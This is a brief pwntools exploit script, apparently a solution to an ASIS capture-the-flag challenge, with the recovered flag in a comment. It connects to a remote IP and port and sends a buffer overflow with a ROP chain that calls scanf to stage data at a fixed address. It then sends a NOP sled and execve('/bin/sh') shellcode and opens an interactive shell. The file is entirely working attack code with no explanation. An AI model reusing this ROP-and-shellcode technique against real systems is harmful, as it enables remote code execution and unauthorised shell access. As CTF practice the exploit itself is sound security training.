#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import time
host = "146.185.168.172"
port = 8642

#ASIS{W3_Do0o_N0o0t_Like_M4N4G3RS_OR_D0_w3?}
r = remote(host,port)
pop_rdi = 0x00000000004006f3
pop_rsi_r15 = 0x00000000004006f1
scanf = 0x400526
payload = "\x90"*120 + p64(pop_rdi) + p64(0x40072b) + p64(pop_rsi_r15) + p64(0x00601500) + p64(0) + p64(scanf) + p64(0x00601500)

r.recvuntil("2000.")
r.sendline(payload)
time.sleep(0.1)
payload = "\x90"*0x100 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
r.sendline(payload)

r.interactive()
